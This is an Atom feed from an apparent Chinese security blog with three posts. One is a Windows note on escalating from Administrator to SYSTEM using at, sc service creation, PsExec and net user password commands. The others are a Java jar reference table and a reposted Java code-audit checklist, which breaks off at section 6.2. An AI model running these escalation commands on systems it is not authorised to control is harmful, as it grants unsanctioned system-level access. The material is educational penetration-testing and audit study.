<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Mi1k7ea</title>
  
  <subtitle>Wiki</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.mi1k7ea.com/"/>
  <updated>2019-11-27T15:25:06.973Z</updated>
  <id>https://www.mi1k7ea.com/</id>
  
  <author>
    <name>Mi1k7ea</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>关于本地提权的学习笔记（一）：Administrator提权到System</title>
    <link href="https://www.mi1k7ea.com/2019/11/27/%E5%85%B3%E4%BA%8E%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E7%9A%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9AAdministrator%E6%8F%90%E6%9D%83%E5%88%B0System/"/>
    <id>https://www.mi1k7ea.com/2019/11/27/关于本地提权的学习笔记（一）：Administrator提权到System/</id>
    <published>2019-11-27T15:12:41.000Z</published>
    <updated>2019-11-27T15:25:06.973Z</updated>
    
    <content type="html"><![CDATA[<p>在Windows中，用户一般分为3大类，即普通用户User、管理员Administrator和系统用户System。System和Administrator的权限并不是包含的，两者之间各有不同的地方，因而有时候即使有管理员Administrator的权限还是无法利用需要System用户才能使用的进程等，所以就需要提权了。</p><p>为了方便在Windows命令行中查看当前用户，可以使用whoami命令，但是需要先将whoami.exe程序放置在C盘中的system32目录中。对于该程序可以在Kali Linux中获得，具体路径为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/windows-binaries/</span><br></pre></td></tr></table></figure><h2 id="0x01-通过at命令实现提权"><a href="#0x01-通过at命令实现提权" class="headerlink" title="0x01 通过at命令实现提权"></a>0x01 通过at命令实现提权</h2><p>这种方法在Windows XP、2003等系统可行，win7之后该命令被删除。</p><p>查看at命令的参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at /?</span><br></pre></td></tr></table></figure><p>找到有/interactive参数，即以交互的方式执行命令，可以看到该命令的执行结果，否则命令在后台执行而看不到。</p><p>在指定时间运行at命令中参数cmd命令（xx:xx表示几时几分，如10:12）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at xx:xx /interactive cmd</span><br></pre></td></tr></table></figure><p>此时从任务管理器可看出cmd命令的用户名是System，接着在该启动的cmd窗口中启动的程序都是以System用户名启动的。但是除了System启动的进程之外，界面还是Administrator用户，为了更方便一些，可以用以下方法实现将界面的操作都转化为用户System的：在System的命令行输入taskmgr命令来用System用户打开任务管理器，将其中Administrator用户的explorer进程终止掉，此时可发现界面背景等都没了，再在任务管理器中的&lt;文件&gt;选项中新建explorer进程，此时的界面就是System用户的界面了。</p><p><img src="/2019/11/27/关于本地提权的学习笔记（一）：Administrator提权到System/1.png" alt=""></p><h2 id="0x02-通过sc命令来创建服务（服务都通过System账号操作）"><a href="#0x02-通过sc命令来创建服务（服务都通过System账号操作）" class="headerlink" title="0x02 通过sc命令来创建服务（服务都通过System账号操作）"></a>0x02 通过sc命令来创建服务（服务都通过System账号操作）</h2><p>在命令行输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc Create syscmd binPath= ”cmd /k start” type= own type= interact</span><br></pre></td></tr></table></figure><p>这样就创建了名为syscmd、类型为交互的、功能为打开新的cmd窗口的服务。需要注意的一点是，在后面的三个参数中等号的后面必须加一个空格，否则无法正常创建服务。可在Run中输入services.msc来查看该服务。</p><p>接着需要在命令行输入以下命令启动服务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc start syscmd</span><br></pre></td></tr></table></figure><p>也可以通过界面来启动该服务即可。</p><p><img src="/2019/11/27/关于本地提权的学习笔记（一）：Administrator提权到System/2.png" alt=""></p><p>图示中已创建了该服务因而显示创建失败。</p><h2 id="0x03-通过SysInternal-Suite工具实现提权"><a href="#0x03-通过SysInternal-Suite工具实现提权" class="headerlink" title="0x03 通过SysInternal Suite工具实现提权"></a>0x03 通过SysInternal Suite工具实现提权</h2><p>从<a href="https://technet.microsoft.com/en-us/sysInternals/bb545027" target="_blank" rel="noopener">网站</a>下载相应的套件即Suite。将其中的PsExec工具放入system32目录中，在命令行中输入PsExec命令来确定参数i交互和s用System用户，输入该命令即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec -i -s cmd</span><br></pre></td></tr></table></figure><p><img src="/2019/11/27/关于本地提权的学习笔记（一）：Administrator提权到System/3.png" alt=""></p><h2 id="0x04-几个命令"><a href="#0x04-几个命令" class="headerlink" title="0x04 几个命令"></a>0x04 几个命令</h2><p>另外一些小知识，关于命令行中用户名的几个命令：</p><p>修改相应的用户的密码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user &lt;用户名&gt; *</span><br></pre></td></tr></table></figure><p>查看所有的用户：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><p>查看当前账号的基本情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user &lt;用户名&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="提权" scheme="https://www.mi1k7ea.com/categories/%E6%8F%90%E6%9D%83/"/>
    
    
      <category term="Windows" scheme="https://www.mi1k7ea.com/tags/Windows/"/>
    
      <category term="提权" scheme="https://www.mi1k7ea.com/tags/%E6%8F%90%E6%9D%83/"/>
    
      <category term="渗透测试" scheme="https://www.mi1k7ea.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>（转）Java项目中常见jar包的说明</title>
    <link href="https://www.mi1k7ea.com/2019/11/25/%EF%BC%88%E8%BD%AC%EF%BC%89Java%E9%A1%B9%E7%9B%AE%E4%B8%AD%E5%B8%B8%E8%A7%81jar%E5%8C%85%E7%9A%84%E8%AF%B4%E6%98%8E/"/>
    <id>https://www.mi1k7ea.com/2019/11/25/（转）Java项目中常见jar包的说明/</id>
    <published>2019-11-25T15:33:03.000Z</published>
    <updated>2019-11-27T14:23:29.253Z</updated>
    
    <content type="html"><![CDATA[<p>转自：<a href="https://blog.csdn.net/superdog007/article/details/50697831" target="_blank" rel="noopener">https://blog.csdn.net/superdog007/article/details/50697831</a></p><table><thead><tr><th style="text-align:left">Jar包</th><th style="text-align:left">作用</th></tr></thead><tbody><tr><td style="text-align:left">axis.jar</td><td style="text-align:left">SOAP引擎包</td></tr><tr><td style="text-align:left">commons-discovery-0.2.jar</td><td style="text-align:left">用来发现、查找和实现可插入式接口，提供一些一般类实例化、单件的生命周期管理的常用方法.</td></tr><tr><td style="text-align:left">jaxrpc.jar</td><td style="text-align:left">Axis运行所需要的组件包</td></tr><tr><td style="text-align:left">saaj.jar</td><td style="text-align:left">创建到端点的点到点连接的方法、创建并处理SOAP消息和附件的方法，以及接收和处理SOAP错误的方法.</td></tr><tr><td style="text-align:left">wsdl4j-1.5.1.jar</td><td style="text-align:left">Axis运行所需要的组件包</td></tr><tr><td style="text-align:left">activation.jar</td><td style="text-align:left">JAF框架的jar包</td></tr><tr><td style="text-align:left">annotations-api.jar</td><td style="text-align:left">使用注解所需jar</td></tr><tr><td style="text-align:left">ant.jar</td><td style="text-align:left">用于自动化调用程序完成项目的编译，打包，测试等</td></tr><tr><td style="text-align:left">aopalliance-1.0.jar</td><td style="text-align:left">支持Spring</td></tr><tr><td style="text-align:left">asm-2.2.3.jar</td><td style="text-align:left">ASM字节码库</td></tr><tr><td style="text-align:left">asm-commons-2.2.3.jar</td><td style="text-align:left">ASM字节码库</td></tr><tr><td style="text-align:left">asm-util-2.2.3.jar</td><td style="text-align:left">Java字节码操纵和分析框架</td></tr><tr><td style="text-align:left">aspectjrt.jar</td><td style="text-align:left">处理事务和AOP所需的包</td></tr><tr><td style="text-align:left">aspectjweaver.jar</td><td style="text-align:left">处理事务和AOP所需的包</td></tr><tr><td style="text-align:left">axiom-api-1.2.7.jar</td><td style="text-align:left">Axis</td></tr><tr><td style="text-align:left">axiom-impl-1.2.7.jar</td><td style="text-align:left">Axis</td></tr><tr><td style="text-align:left">bcprov-jdk15-140.jar</td><td style="text-align:left">基于java1.5</td></tr><tr><td style="text-align:left">bfmclientmodel.jar</td><td style="text-align:left">使用WebSphere所需jar包</td></tr><tr><td style="text-align:left">bpcclientcore.jar</td><td style="text-align:left">使用WebSphere所需jar包</td></tr><tr><td style="text-align:left">bpe137650.jar</td><td style="text-align:left">提供远程访问BPE容器的实现。</td></tr><tr><td style="text-align:left">bsh-2.0b4.jar</td><td style="text-align:left">解决负载逻辑运算</td></tr><tr><td style="text-align:left">c3p0-0.9.0.jar</td><td style="text-align:left">开放源代码的JDBC连接池</td></tr><tr><td style="text-align:left">cglib-nodep-2.1_3.jar</td><td style="text-align:left">Spring中自动代理所需jar包</td></tr><tr><td style="text-align:left">cobertura.jar</td><td style="text-align:left">测量测试覆盖率</td></tr><tr><td style="text-align:left">commons-beanutils-1.7.0.jar</td><td style="text-align:left">动态的获取/设值Java</td></tr><tr><td style="text-align:left">commons-chain-1.1.jar</td><td style="text-align:left">实现责任链设计模式的Java</td></tr><tr><td style="text-align:left">commons-codec-1.3.jar</td><td style="text-align:left">用来处理常用的编码方法的工具类包，例如DES、SHA1、MD5、Base64等等</td></tr><tr><td style="text-align:left">commons-collections-3.1.jar</td><td style="text-align:left">对标准java</td></tr><tr><td style="text-align:left">commons-collections.jar</td><td style="text-align:left">对标准java</td></tr><tr><td style="text-align:left">commons-digester-1.8.jar</td><td style="text-align:left">用于处理struts-config.xml配置文件</td></tr><tr><td style="text-align:left">commons-fileupload-1.1.1.jar</td><td style="text-align:left">struts上传文件</td></tr><tr><td style="text-align:left">commons-httpclient-3.1.jar</td><td style="text-align:left">用来简化HTTP客户端与服务器端进行各种通信编程实现</td></tr><tr><td style="text-align:left">commons-io-1.1.jar</td><td style="text-align:left">针对java.io.InputStream和Reader进行了扩展</td></tr><tr><td style="text-align:left">commons-lang-2.4.jar</td><td style="text-align:left">对java.lang.*的扩展</td></tr><tr><td style="text-align:left">commons-logging-1.1.1.jar</td><td style="text-align:left">日志包</td></tr><tr><td style="text-align:left">commons-pool-1.3.jar</td><td style="text-align:left">实现对象池化框架</td></tr><tr><td style="text-align:left">commons-validator-1.3.1.jar</td><td style="text-align:left">用来把验证规则程序提取出来，以供重复使用</td></tr><tr><td style="text-align:left">db2jcc.jar</td><td style="text-align:left">java连接DB2所需jar</td></tr><tr><td style="text-align:left">db2jcc_license_cu.jar</td><td style="text-align:left">java连接DB2所需jar</td></tr><tr><td style="text-align:left">dom4j-1.6.1.jar</td><td style="text-align:left">解析XML</td></tr><tr><td style="text-align:left">ehcache-1.2.4.jar</td><td style="text-align:left">hibernate的二级缓存如果用ehcache的时候需要此jar包</td></tr><tr><td style="text-align:left">emf.jar</td><td style="text-align:left">基于Eclipse的模型框架</td></tr><tr><td style="text-align:left">ezmorph-1.0.6.jar</td><td style="text-align:left">使用JSON所需的jar包</td></tr><tr><td style="text-align:left">FastInfoset-1.2.2.jar</td><td style="text-align:left">使用WebService所需的jar包</td></tr><tr><td style="text-align:left">freemarker-2.3.8.jar</td><td style="text-align:left">Strus2支持的一种表现层框架</td></tr><tr><td style="text-align:left">geronimo-activation_1.1_spec-1.0.2.jar</td><td style="text-align:left">Apache</td></tr><tr><td style="text-align:left">geronimo-annotation_1.0_spec-1.1.1.jar</td><td style="text-align:left">Apache</td></tr><tr><td style="text-align:left">geronimo-javamail_1.4_spec-1.3.jar</td><td style="text-align:left">Apache</td></tr><tr><td style="text-align:left">geronimo-jaxws_2.1_spec-1.0.jar</td><td style="text-align:left">Apache</td></tr><tr><td style="text-align:left">geronimo-jms_1.1_spec-1.1.1.jar</td><td style="text-align:left">Apache</td></tr><tr><td style="text-align:left">geronimo-servlet_2.5_spec-1.2.jar</td><td style="text-align:left">Apache</td></tr><tr><td style="text-align:left">geronimo-stax-api_1.0_spec-1.0.1.jar</td><td style="text-align:left">Apache</td></tr><tr><td style="text-align:left">hibernate3.jar</td><td style="text-align:left">Hibernate3的核心jar包</td></tr><tr><td style="text-align:left">htmclientmodel.jar</td><td style="text-align:left">使用WebSphere所需jar包</td></tr><tr><td style="text-align:left">jakarta-oro.jar</td><td style="text-align:left">一套文本处理工具，提供per15.0兼容的表达式，AWK-like表达式，Glob表达式。</td></tr><tr><td style="text-align:left">javassist.jar</td><td style="text-align:left">Javassist</td></tr><tr><td style="text-align:left">jaxb-api-2.1.jar</td><td style="text-align:left">使用WebService所需的jar包</td></tr><tr><td style="text-align:left">jaxb-impl-2.1.7.jar</td><td style="text-align:left">使用CXF所需jar包</td></tr><tr><td style="text-align:left">jaxb-xjc-2.1.7.jar</td><td style="text-align:left">使用CXF所需jar包</td></tr><tr><td style="text-align:left">jaxen-1.1.1.jar</td><td style="text-align:left">解析XML</td></tr><tr><td style="text-align:left">jcifs-1.2.22.jar</td><td style="text-align:left">实现单点登陆</td></tr><tr><td style="text-align:left">jdom2-1.0.jar</td><td style="text-align:left">解析XML</td></tr><tr><td style="text-align:left">jdom-1.0.jar</td><td style="text-align:left">解析XML</td></tr><tr><td style="text-align:left">jettison-1.0.1.jar</td><td style="text-align:left">使用CXF所需jar包</td></tr><tr><td style="text-align:left">jetty-6.1.9.jar</td><td style="text-align:left">Jetty</td></tr><tr><td style="text-align:left">jetty-util-6.1.9.jar</td><td style="text-align:left">Jetty</td></tr><tr><td style="text-align:left">jra-1.0-alpha-4.jar</td><td style="text-align:left">使用CXF所需jar包</td></tr><tr><td style="text-align:left">js-1.6R7.jar</td><td style="text-align:left">使用CXF所需jar包</td></tr><tr><td style="text-align:left">json-lib-2.2.3-jdk13.jar</td><td style="text-align:left">使用JSON所需的jar包</td></tr><tr><td style="text-align:left">jsonplugin-0.25.jar</td><td style="text-align:left">strus2的JSON插件</td></tr><tr><td style="text-align:left">jsr311-api-0.8.jar</td><td style="text-align:left">使用CXF所需jar包</td></tr><tr><td style="text-align:left">jstl.jar</td><td style="text-align:left">JSTL标签库</td></tr><tr><td style="text-align:left">jta.jar</td><td style="text-align:left">标准的</td></tr><tr><td style="text-align:left">junit.jar</td><td style="text-align:left">用于单元测试</td></tr><tr><td style="text-align:left">jxl.jar</td><td style="text-align:left">通过java操作excel表格的工具类库</td></tr><tr><td style="text-align:left">ldap.jar</td><td style="text-align:left">JNDI目录服务和LDAO服务器所需的jar</td></tr><tr><td style="text-align:left">ldapbp.jar</td><td style="text-align:left">JNDI目录服务和LDAO服务器所需的jar</td></tr><tr><td style="text-align:left">log4j-1.2.15.jar</td><td style="text-align:left">提供日志功能</td></tr><tr><td style="text-align:left">mail.jar</td><td style="text-align:left">java发送邮件jar包</td></tr><tr><td style="text-align:left">neethi-2.0.4.jar</td><td style="text-align:left">使用CXF所需jar包</td></tr><tr><td style="text-align:left">odmg-3.0.jar</td><td style="text-align:left">ODMG是一个ORM的规范，Hibernate实现了ODMG规范，这是一个核心的库</td></tr><tr><td style="text-align:left">gnl-2.6.11.jar</td><td style="text-align:left">struts2中OGNL语言</td></tr><tr><td style="text-align:left">ojdbc14.jar</td><td style="text-align:left">Oracle数据库驱动包</td></tr><tr><td style="text-align:left">opensaml-1.1.jar</td><td style="text-align:left">使用CXF所需jar包</td></tr><tr><td style="text-align:left">oro-2.0.8.jar</td><td style="text-align:left">Validator框架所需的jar包</td></tr><tr><td style="text-align:left">oscache-2.1.jar</td><td style="text-align:left">Java</td></tr><tr><td style="text-align:left">poi-3.1-FINAL-20080629.jar</td><td style="text-align:left">操作exce所需jar包</td></tr><tr><td style="text-align:left">poi-contrib-3.1-FINAL-20080629.jar</td><td style="text-align:left">操作exce所需jar包</td></tr><tr><td style="text-align:left">poi-ooxml-3.6-20091214.jar</td><td style="text-align:left">提供对office的word、excel、visio及ppt的操作</td></tr><tr><td style="text-align:left">poi-ooxml-schemas-3.6-20091214.jar</td><td style="text-align:left">提供对office的word、excel、visio及ppt的操作</td></tr><tr><td style="text-align:left">poi-scratchpad-3.1-FINAL-20080629.jar</td><td style="text-align:left">提供对office的word、excel、visio及ppt的操作</td></tr><tr><td style="text-align:left">processCommon.jar</td><td style="text-align:left">IBM</td></tr><tr><td style="text-align:left">ProcessCommonLibrary.jar</td><td style="text-align:left">IBM</td></tr><tr><td style="text-align:left">processIdentity.jar</td><td style="text-align:left">IBM</td></tr><tr><td style="text-align:left">ProcessInformation.jar</td><td style="text-align:left">进程监视软件包</td></tr><tr><td style="text-align:left">proxool-0.9.1.jar</td><td style="text-align:left">数据库连接池</td></tr><tr><td style="text-align:left">proxool-cglib.jar</td><td style="text-align:left">数据库连接池</td></tr><tr><td style="text-align:left">quartz-1.6.0.jar</td><td style="text-align:left">开源作业调度框架</td></tr><tr><td style="text-align:left">saaj-api-1.3.jar</td><td style="text-align:left">使用axis所需的jar</td></tr><tr><td style="text-align:left">saaj-impl-1.3.2.jar</td><td style="text-align:left">使用axis所需的jar</td></tr><tr><td style="text-align:left">serializer-2.7.1.jar</td><td style="text-align:left">XML序列化</td></tr><tr><td style="text-align:left">slf4j-jdk14-1.5.6.jar</td><td style="text-align:left">整合各种日志框架的工具</td></tr><tr><td style="text-align:left">spring208.jar</td><td style="text-align:left">spring核心框架</td></tr><tr><td style="text-align:left">spring-ldap-1.2-RC1.jar</td><td style="text-align:left">spring下LDAP</td></tr><tr><td style="text-align:left">spring-mock.jar</td><td style="text-align:left">spring的测试框架</td></tr><tr><td style="text-align:left">standard.jar</td><td style="text-align:left">使用JSTL标签库所需的jar</td></tr><tr><td style="text-align:left">stax-api-1.0.1.jar</td><td style="text-align:left">解析XML</td></tr><tr><td style="text-align:left">struts2-core-2.0.14.jar</td><td style="text-align:left">struts2核心jar</td></tr><tr><td style="text-align:left">struts2-spring-plugin-2.0.6.jar</td><td style="text-align:left">struts2整合Spring所需jar</td></tr><tr><td style="text-align:left">taglibs-datetime.jar</td><td style="text-align:left">Apache开源组织提供标签库，用于格式化日期。</td></tr><tr><td style="text-align:left">taglibs-mailer.jar</td><td style="text-align:left">用于发送邮件</td></tr><tr><td style="text-align:left">taglibs-string.jar</td><td style="text-align:left">Apache开源组织提供标签库，用于对String的操作。</td></tr><tr><td style="text-align:left">task137650.jar</td><td style="text-align:left">Portal技术在SOA系统集成应用中实现所需的jar</td></tr><tr><td style="text-align:left">utility.jar</td><td style="text-align:left">Apache开源组织提供标签库</td></tr><tr><td style="text-align:left">velocity-1.5.jar</td><td style="text-align:left">一个免费的开源模板框架</td></tr><tr><td style="text-align:left">wsdl4j-1.6.2.jar</td><td style="text-align:left">用来解析服务的WSDl文件</td></tr><tr><td style="text-align:left">wss4j-1.5.4.jar</td><td style="text-align:left">创建CXF所需jar</td></tr><tr><td style="text-align:left">wss4j-1.5.4.jar</td><td style="text-align:left">创建CXF所需jar</td></tr><tr><td style="text-align:left">wstx-asl-3.2.6.jar</td><td style="text-align:left">创建CXF所需jar</td></tr><tr><td style="text-align:left">xbean-spring-2.8.jar</td><td style="text-align:left">使用xfire所需jar</td></tr><tr><td style="text-align:left">xerces-2.6.2.jar</td><td style="text-align:left">XML解析器</td></tr><tr><td style="text-align:left">xfire-all-1.2.6.jar</td><td style="text-align:left">用于实现WebService</td></tr><tr><td style="text-align:left">XmlSchema-1.1.jar</td><td style="text-align:left">使用xfire所需jar</td></tr><tr><td style="text-align:left">xwork-2.0.7.jar</td><td style="text-align:left">WebWork核心jar</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>（转）Java代码审计指南</title>
    <link href="https://www.mi1k7ea.com/2019/11/25/%EF%BC%88%E8%BD%AC%EF%BC%89Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%8C%87%E5%8D%97/"/>
    <id>https://www.mi1k7ea.com/2019/11/25/（转）Java代码审计指南/</id>
    <published>2019-11-25T14:20:15.000Z</published>
    <updated>2019-11-27T14:23:36.460Z</updated>
    
    <content type="html"><![CDATA[<p>转自：<a href="http://blog.nsfocus.net/code-audit-instruction/" target="_blank" rel="noopener">http://blog.nsfocus.net/code-audit-instruction/</a></p><h2 id="一、测试工具"><a href="#一、测试工具" class="headerlink" title="一、测试工具"></a>一、测试工具</h2><h3 id="1-1-反编译java类"><a href="#1-1-反编译java类" class="headerlink" title="1.1 反编译java类"></a>1.1 反编译java类</h3><p>如果项目中未提供所有java源代码，只提供编译后的class文件，可以运行jd-gui，选择菜单File—Open File，对class文件进行反编译</p><p><img src="/2019/11/25/（转）Java代码审计指南/1.png" alt=""></p><p><img src="/2019/11/25/（转）Java代码审计指南/2.png" alt=""></p><p>选择class文件或者jar包，点击打开按钮，即可查看反汇编后的java源代码</p><p><img src="/2019/11/25/（转）Java代码审计指南/3.png" alt=""></p><h3 id="1-2-Eclipse环境审计"><a href="#1-2-Eclipse环境审计" class="headerlink" title="1.2 Eclipse环境审计"></a>1.2 Eclipse环境审计</h3><p>使用Eclipse的Import功能将程序代码导入workspace，打开任一java源文件，选择Source Analyse菜单下的条目进行关键方法搜索，搜索结果在窗口下面显示，然后进行人工分析。</p><p><img src="/2019/11/25/（转）Java代码审计指南/4.png" alt=""></p><h2 id="二、认证管理"><a href="#二、认证管理" class="headerlink" title="二、认证管理"></a>二、认证管理</h2><h3 id="2-1-图形验证码"><a href="#2-1-图形验证码" class="headerlink" title="2.1 图形验证码"></a>2.1 图形验证码</h3><ul><li>用户登录过程是否有图形验证码保护，防止自动化程序猜测密码</li><li>验证码复杂度是否符合要求（干扰、变形）</li><li>验证码在使用过一次后是否会自动刷新</li><li>验证码明文是否会被传送给客户端（页面或Cookie）</li><li>验证码是否在被保护的操作进行前来验证（无验证或无效验证）</li></ul><h3 id="2-2-认证实现"><a href="#2-2-认证实现" class="headerlink" title="2.2 认证实现"></a>2.2 认证实现</h3><ul><li>用户认证过程中，用户名和密码合法性的检查方式是否符合要求</li></ul><p>较安全的做法为先校验验证码，再检查用户名，最后比对密码的密文</p><ul><li>是否具备用户注销功能</li></ul><p>用户注销时是否清理了当前用户会话</p><ul><li>是否会将密码作为重定向的一部分进行传送</li></ul><p>在统一认证SSO模式下，有的实现并非使用Token来交换认证信息，而是通过客户端直接传递账号、密码，这种情形下有可能在URL中直接传递明文密码。</p><ul><li>认证过程中对于用户名错误和密码错误提示是否相同</li></ul><p>统一用户名和密码错误提示，可以降低账号、密码被猜解的风险</p><ul><li>检查用户认证页面是否对认证失败的次数进行了限制</li></ul><h2 id="三、授权管理"><a href="#三、授权管理" class="headerlink" title="三、授权管理"></a>三、授权管理</h2><h3 id="3-1-授权实现"><a href="#3-1-授权实现" class="headerlink" title="3.1 授权实现"></a>3.1 授权实现</h3><ul><li>应用的用户是否具有角色的区分</li></ul><p>明确用户的角色定义、授权访问的范围，分析哪种情况下可能会导致越权</p><ul><li>应用是否具备统一的（或独立）的权限控制模块</li></ul><p>大部分的大型应用都会采用统一的权限控制模块</p><ul><li>应用的权限控制模块是否存在漏洞</li><li>页面/功能是否使用了权限控制（模块）</li></ul><p>识别出需要和无需权限控制的页面/功能，逐一进行验证。验证过程中需要考虑到用户的角色划分。</p><ul><li>页面的权限控制是否正确</li></ul><p>部分应用的权限控制（模块）的使用上存在缺陷，攻击者可能通过一些隐蔽的途径绕过鉴权，访问非授权资源</p><h3 id="3-2-授权管理"><a href="#3-2-授权管理" class="headerlink" title="3.2 授权管理"></a>3.2 授权管理</h3><ul><li>高权限用户分析</li></ul><p>分析系统高权限用户（例如：管理员用户）的分配情况及密码复杂度等</p><ul><li>默认用户分析</li></ul><p>分析系统是否存在默认用户、密码，密码复杂度等。</p><h2 id="四、输入-输出验证"><a href="#四、输入-输出验证" class="headerlink" title="四、输入/输出验证"></a>四、输入/输出验证</h2><h3 id="4-1-SQL注入防护"><a href="#4-1-SQL注入防护" class="headerlink" title="4.1 SQL注入防护"></a>4.1 SQL注入防护</h3><ul><li>是否存在全局过滤器</li></ul><p>过滤器配置、过滤函数等</p><ul><li>过滤器是否可以过滤所有查询请求</li></ul><p>请求是否都按要求经过过滤器处理</p><ul><li>过滤器的过滤是否符合要求</li></ul><p>初期检查可以依据PHPIDS的规则库，后期根据收集的情况予以补充</p><ul><li>是否使用了预查询机制</li></ul><p>预查询是指在将数据传入SQL语句前明确指定传输数据的类型，以执行必要的转换。在Java中预查询的调用方式为prepareStatement。</p><ul><li>是否存在SQL语句拼接</li></ul><p>某些特殊的查询（特别复杂的组合查询）难免用到SQL语句拼接，遇到这种情况，就需要检查拼接是否有可能导致注入。</p><h3 id="4-2-跨站攻击防护"><a href="#4-2-跨站攻击防护" class="headerlink" title="4.2 跨站攻击防护"></a>4.2 跨站攻击防护</h3><ul><li>是否存在全局XSS过滤器(论坛的过滤库)</li><li>过滤器的过滤是否符合要求</li><li>是否存在需过滤和不需过滤两种输出，页面是否控制恰当（*）</li></ul><p>某些情况下可能存在两种输出，文本输出和富文本（HTML）输出，要强制文本输出，只需要调用HTMLEncode()对内容进行编码后输出即可；但是富文本本身就需要使用html来进行格式的控制，简单的编码就无法使用，这时需要在此类内容从客户端输入（用户提交）或输出给客户端（显示）时进行危险代码过滤。</p><ul><li>输出的时候是否进行编码（HTML、JS）</li></ul><h3 id="4-3-CSRF攻击防护"><a href="#4-3-CSRF攻击防护" class="headerlink" title="4.3 CSRF攻击防护"></a>4.3 CSRF攻击防护</h3><ul><li>Web表单是否使用了Token（或验证码）</li><li>Web表单提交（成功或不成功）后token（或验证码）是否重置</li><li>检查Token的生成算法是否安全</li></ul><p>可以从测试环境来检查生成的验证码是否符合复杂性要求，如是否有干扰线/点、字符变形等。</p><ul><li>检查服务器获取Web表单参数值的方式</li></ul><p>如果在操作时不严格区分GET和POST，在没有Token（或验证码）的辅助下很容易导致CSRF的发生。</p><h3 id="4-4-文件上传防护"><a href="#4-4-文件上传防护" class="headerlink" title="4.4 文件上传防护"></a>4.4 文件上传防护</h3><ul><li>是否限制了上传文件的扩展名</li></ul><p>以白名单形式指定允许上传的扩展名；以黑名单形式指定禁止上传的文件名</p><ul><li>是否对上传文件进行了重命名操作</li></ul><p>重命名操作是否安全，防止重命名过程中产生二次风险</p><ul><li>是否对上传文件的存放位置禁止了脚本执行</li></ul><h3 id="4-5-文件下载防护"><a href="#4-5-文件下载防护" class="headerlink" title="4.5 文件下载防护"></a>4.5 文件下载防护</h3><ul><li>是否存在客户端指定文件名的下载功能</li><li>直接指定文件名的下载是否允许客户端指定路径</li><li>对于不同用户的文件在下载时是否进行了权限控制</li></ul><p>文件下载功能中是否对用户的权限进行了检查。</p><h3 id="4-6-重定向与转发保护"><a href="#4-6-重定向与转发保护" class="headerlink" title="4.6 重定向与转发保护"></a>4.6 重定向与转发保护</h3><ul><li>是否具有客户端控制的重定向或转发</li><li>是否定义了重定向的信任域名或主机列表</li><li>是否对客户端的重定向或转发请求进行检查</li></ul><h2 id="五、会话管理"><a href="#五、会话管理" class="headerlink" title="五、会话管理"></a>五、会话管理</h2><h3 id="5-1-Session管理"><a href="#5-1-Session管理" class="headerlink" title="5.1 Session管理"></a>5.1 Session管理</h3><ul><li>session信息是否放在url里面</li></ul><p>通过应用服务器的配置检查</p><ul><li>执行业务功能时，是否检查了当前用户session身份</li></ul><p>从代码部分、从配置部分检查，需要根据应用实际使用的验证方式</p><ul><li>成功登陆之后是否会更新SessionID</li></ul><p>认证成功后是否强制刷新用户使用的SessionID</p><ul><li>session是否有超时注销功能</li></ul><p>检查Session的超时时间设置是否符合要求，默认是20~30分钟</p><h3 id="5-2-Cookie管理"><a href="#5-2-Cookie管理" class="headerlink" title="5.2 Cookie管理"></a>5.2 Cookie管理</h3><ul><li>是否会在Cookie中存储明文或简单编码/加密过的密码</li><li>是否会在Cookie中存储应用的特权标识</li><li>是否设置了Cookie的有效域和有效路径</li><li>是否设置了合适的Cookie有效时间</li></ul><p>如果生存时间在20~30分钟左右，使用Session方式会更加安全</p><h2 id="六、密码管理"><a href="#六、密码管理" class="headerlink" title="六、密码管理"></a>六、密码管理</h2><h3 id="6-1-加密安全"><a href="#6-1-加密安全" class="headerlink" title="6.1 加密安全"></a>6.1 加密安全</h3><ul><li>密码是否以不可逆的哈希形态存储</li><li>是否使用不带salt的哈希算法来加密密码</li><li>加密哈希算法中的salt是否硬编码在代码中</li></ul><h3 id="6-2-密码安全"><a href="#6-2-密码安全" class="headerlink" title="6.2 密码安全"></a>6.2 